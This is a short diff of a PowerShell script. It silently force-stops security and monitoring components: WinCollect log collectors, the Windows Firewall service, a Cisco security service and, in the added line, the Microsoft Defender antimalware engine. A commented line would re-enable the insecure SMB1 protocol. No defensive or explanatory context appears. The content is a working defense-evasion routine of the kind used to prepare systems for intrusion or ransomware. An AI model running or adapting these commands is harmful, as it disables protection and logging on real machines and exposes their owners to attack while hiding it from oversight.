@@ -1,5 +1,6 @@
 Stop-Process -Name "WinCollectSvc" -Force -ErrorAction Ignore
 Stop-Process -Name "WinCollect" -Force -ErrorAction Ignore
+Stop-Process -Name "MsMpEng" -Force -ErrorAction Ignore
 Stop-Service -Name "mpssvc" -Force -ErrorAction Ignore
 Stop-Service -Name "CiscoSCMS" -Force -ErrorAction Ignore
 #Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force -ErrorAction Ignore
